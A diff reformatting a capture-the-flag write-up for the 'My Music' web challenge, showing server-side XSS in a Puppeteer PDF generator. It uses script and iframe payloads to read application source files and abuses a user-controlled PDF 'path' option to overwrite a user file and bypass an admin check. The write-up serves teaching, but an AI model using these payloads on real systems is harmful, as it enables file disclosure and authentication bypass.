@@ -1,28 +1,44 @@
 ---
-CTF: INTIGRITI 1337UP LIVE 2023
-Challenge Name: My Music
-Category: Web
-Date: 17/11/23
-Author: holmesec
-Points: 497
-Solves: 10
+name: My Music (2023)
+event: Intigriti 1337UP Live CTF 2023
+category: Web
+description: Writeup for My Music (Web) - Intigriti 1337UP Live CTF (2023) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
 ---
+
+# My Music
+
+## Video Walkthrough
+
 [![VIDEO](https://img.youtube.com/vi/JetPydd3ud4/0.jpg)](https://www.youtube.com/watch?v=JetPydd3ud4 "My Music: Leveraging Server Side XSS (PDF) for Auth Bypass")
 
-### Description
->Checkout my new platform for sharing the tunes of your life! 🎶
+## Description
 
-# Solution
+> Checkout my new platform for sharing the tunes of your life! 🎶
+
 ## Enumeration
+
 Register an account, notice we are given a login hash to save, e.g. `25d6a4cec174932f1effd56e2273be5198c3be06ddf03ab380a7ffc4cf3ef4e8`.
 
 We can `generate profile card` which creates a PDF but [by default] the request/response doesn't show in burp, let's make some adjustments:
-- Set burp scope to `https://mymusic.ctf.intigriti.io` and tick the `only show in-scope items` option in HTTP history tab (reduces noise, especially from spotify requests).
-- Tick `images` and `other binary` in the the `filter by MIME type` section of the HTTP history options (ensuring our PDF generation is shown). 
+
+-   Set burp scope to `https://mymusic.ctf.intigriti.io` and tick the `only show in-scope items` option in HTTP history tab (reduces noise, especially from spotify requests).
+-   Tick `images` and `other binary` in the the `filter by MIME type` section of the HTTP history options (ensuring our PDF generation is shown).
 
 We can update three sections of our profile; `First name`, `Last name` and `Spotify track code`. For each element we add some HTML tags, e.g. `<b>crypto</b>` and try to generate a new profile card. All three elements are reflected in the PDF document, but only the `Spotify track code` is in bold.
 
 Now we have found HTML injection, we can try and [server-side XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) to identify the file structure.
+
 ```js
 <script>document.body.append(location.href)</script>
 ```
@@ -30,12 +46,15 @@ Now we have found HTML injection, we can try and [server-side XSS](https://book.
 Returns `file:///app/tmp/3c433348-60e3-4a48-b989-2a168954147f.html`
 
 Since we confirmed the file location as `/app`, we can enumerate common files, either manually or by brute-forcing a [wordlist](https://github.com/danielmiessler/SecLists).
-### app/app.js
+
+#### app/app.js
+
 ```js
 <iframe src="/app/app.js" style="width: 999px; height: 999px"></iframe>
 ```
 
 We'll quickly recover the source code for `app.js`.
+
 ```js
 const express = require("express");
 const { engine } = require("express-handlebars");
@@ -57,12 +76,15 @@ app.listen(3000, () => {
 ```
 
 This introduces some new paths to investigate (`/routes/index` and `/routes/api`) so we repeat the previous technique.
-### app/routes/index.js
+
+#### app/routes/index.js
+
 ```js
 <iframe src="/app/routes/index.js" style="width: 999px; height: 999px"></iframe>
 ```
 
 `index.js` confirms our target is the `/admin` endpoint. Currently, when we try to access the page we get `Only admins can view this page`.
+
 ```js
 const express = require("express");
 const { requireAuth } = require("../middleware/auth");
@@ -102,12 +124,15 @@ module.exports = router;
 ```
 
 It also revealed some new paths (`/middleware/auth`, `/middleware/check_admin`, `/utils/recommendedSongs` and `/utils/generateProfileCard`), which we'll return to shortly.
-### app/routes/api.js
+
+#### app/routes/api.js
+
 ```js
 <iframe src="/app/routes/api.js" style="width: 999px; height: 999px"></iframe>
 ```
 
 `api.js` deals with the register/login/update functionality, nothing particularly interesting.
+
 ```js
 const express = require("express");
 const { body, cookie } = require("express-validator");
@@ -153,12 +178,18 @@ module.exports = router;
 ```
 
 However, it does give us a new file to check out (`/controllers/user`).
-### app/controllers/user.js
+
+#### app/controllers/user.js
+
 ```js
-<iframe src="/app/controllers/user.js" style="width: 999px; height: 999px"></iframe>
+<iframe
+    src="/app/controllers/user.js"
+    style="width: 999px; height: 999px"
+></iframe>
 ```
 
-This file is responsible for adding, updating and *verifying* users.
+This file is responsible for adding, updating and _verifying_ users.
+
 ```js
 const {
     createUser,
@@ -226,12 +257,18 @@ const updateUserData = (req, res, next) => {
 ```
 
 We find a `/services/user` endpoint, which might be interesting since the `getUser(loginHash)` function is imported from there.
-### app/controllers/user.js
+
+#### app/controllers/user.js
+
 ```js
-<iframe src="/app/services/user.js" style="width: 999px; height: 999px"></iframe>
+<iframe
+    src="/app/services/user.js"
+    style="width: 999px; height: 999px"
+></iframe>
 ```
 
 Now we learn more about how users are stored!
+
 ```js
 const fs = require("fs");
 const path = require("path");
@@ -276,22 +313,30 @@ module.exports = { createUser, getUser, setUserData, userExists };
 First of all we see the `./data` folder, useful knowledge as we already have a method of reading (maybe writing) files.
 
 Secondly, we discover how user files are formatted.
+
 ```js
 const loginHash = createHash("sha256").update(uuidv4()).digest("hex");
 fs.writeFileSync(
-	path.join(dataDir, `${loginHash}.json`),
-	JSON.stringify(userData)
+    path.join(dataDir, `${loginHash}.json`),
+    JSON.stringify(userData)
 );
 ```
 
 Since our login hash is displayed on the page, we know exactly where our user object is located.
+
 ```bash
 /app/data/25d6a4cec174932f1effd56e2273be5198c3be06ddf03ab380a7ffc4cf3ef4e8.json
 ```
-### app/middleware/check_admin.js
+
+#### app/middleware/check_admin.js
+
 Returning back to the four new endpoints we found in `app/routes/index.js`. The most interesting is likely to be `check_admin.js`. Why is this most interesting to us? Because we want to be admin, of course!
+
 ```js
-<iframe src="/app/middleware/check_admin.js" style="width: 999px; height: 999px"></iframe>
+<iframe
+    src="/app/middleware/check_admin.js"
+    style="width: 999px; height: 999px"
+></iframe>
 ```
 
 ```js
@@ -326,6 +371,7 @@ At this point we might think about how we could inject `isAdmin: true` into our 
 Another question we may consider; what happens if the JSON object cannot be parsed? 👀
 
 Let's revisit the code from `/app/routes/index.js`. Specifically, the `generate-profile-card` POST request.
+
 ```js
 router.post("/profile/generate-profile-card", requireAuth, async (req, res) => {
     const pdf = await generatePDF(req.userData, req.body.userOptions);
@@ -335,12 +381,18 @@ router.post("/profile/generate-profile-card", requireAuth, async (req, res) => {
 ```
 
 We already knew that our `userData` would be inserted to the PDF (that's how we were able to inject code), but what's this `userOptions` parameter? Let's go find out!
-### app/utils/generateProfileCard.js
+
+#### app/utils/generateProfileCard.js
+
 ```js
-<iframe src="/app/utils/generateProfileCard.js" style="width: 999px; height: 999px"></iframe>
+<iframe
+    src="/app/utils/generateProfileCard.js"
+    style="width: 999px; height: 999px"
+></iframe>
 ```
 
-We found this endpoint earlier when checking `/app/routes/index.js`. 
+We found this endpoint earlier when checking `/app/routes/index.js`.
+
 ```js
 const puppeteer = require("puppeteer");
 const fs = require("fs");
@@ -380,30 +432,36 @@ module.exports = { generatePDF };
 ```
 
 This part is notable; our `userOptions` are passed as options to the `pdf` function in puppeteer.
+
 ```js
 if (userOptions) {
-        options = { ...options, ...userOptions };
-    }
-    const pdf = await page.pdf(options);
+    options = { ...options, ...userOptions };
+}
+const pdf = await page.pdf(options);
 ```
 
 Time to [RTFM](https://pptr.dev/api/puppeteer.pdfoptions) 🤷‍♂️
 
-| Property | Modifiers | Type | Description | Default |
-| -------- | -------- | -------- | -------- | -------- |
-| path | `optional` | string | The path to save the file to | `undefined`, which means the PDF will not be written to disk |
+| Property | Modifiers  | Type   | Description                  | Default                                                      |
+| -------- | ---------- | ------ | ---------------------------- | ------------------------------------------------------------ |
+| path     | `optional` | string | The path to save the file to | `undefined`, which means the PDF will not be written to disk |
 
 ## Exploitation
+
 OK, enough with the recon. exploit time!
-- When we try to access the `/admin` endpoint, it will parse our `userData` JSON object and return a 403 error if it does not contain `isAdmin: true`.
-- However, if the JSON object cannot be parsed (as hinted earlier), then the code following the if statement (that returns a 403 response) will not be reached.
-- Does this mean we won't be rejected from viewing the admin page? Let's find out!
+
+-   When we try to access the `/admin` endpoint, it will parse our `userData` JSON object and return a 403 error if it does not contain `isAdmin: true`.
+-   However, if the JSON object cannot be parsed (as hinted earlier), then the code following the if statement (that returns a 403 response) will not be reached.
+-   Does this mean we won't be rejected from viewing the admin page? Let's find out!
+
 ### Attack Plan
-1) We know we can control the `userOptions` which is passed to the puppeteer `pdf` function.
-2) We identified the `path` property that allows us to control the location where the generated PDF will be stored.
-3) We found that user objects are stored in `/app/data/<login_hash>.json`
+
+1. We know we can control the `userOptions` which is passed to the puppeteer `pdf` function.
+2. We identified the `path` property that allows us to control the location where the generated PDF will be stored.
+3. We found that user objects are stored in `/app/data/<login_hash>.json`
 
 Putting all this together, we create a payload that will overwrite our user object with a generated PDF.
+
 ```json
 {
     "userOptions": {
@@ -413,11 +471,11 @@ Putting all this together, we create a payload that will overwrite our user obje
 ```
 
 We send this payload in the POST request used to generate a PDF (make sure to set content-type to `application/json`). When we login with the hash and return to `/admin`, we get the flag.
-```txt
-INTIGRITI{0verr1d1ng_4nd_n0_r3turn_w4s_n3ed3d_for_th15_fl4g_to_b3_e4rn3d}
-```
+
+Flag:`INTIGRITI{0verr1d1ng_4nd_n0_r3turn_w4s_n3ed3d_for_th15_fl4g_to_b3_e4rn3d}`
 
 Note: I used this technique to overwrite our existing user object with a PDF (invalid JSON), but you could pick a filename of your choice, e.g.
+
 ```json
 {
     "userOptions": {
